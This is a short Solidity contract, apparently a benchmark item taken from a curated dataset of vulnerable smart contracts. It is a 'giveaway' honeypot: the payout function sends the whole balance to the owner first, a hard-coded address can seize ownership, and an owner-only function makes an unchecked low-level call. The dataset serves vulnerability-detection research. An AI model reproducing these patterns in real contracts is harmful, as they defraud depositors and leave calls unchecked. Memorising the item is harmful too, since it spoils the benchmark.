// Benchmark candidate ported from smartbugs-curated: dataset/unchecked_low_level_calls/0x7a4349a749e59a5736efb7826ee3496a2dfd5489.sol
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.20;

contract SbWhaleGiveaway1
{
    address public Owner = msg.sender;

    receive()
    external
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {
            payable(Owner).transfer(address(this).balance);
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function withdraw()
    payable
    public
    {
        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }

    function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call{value: msg.value}(data);
    }
}
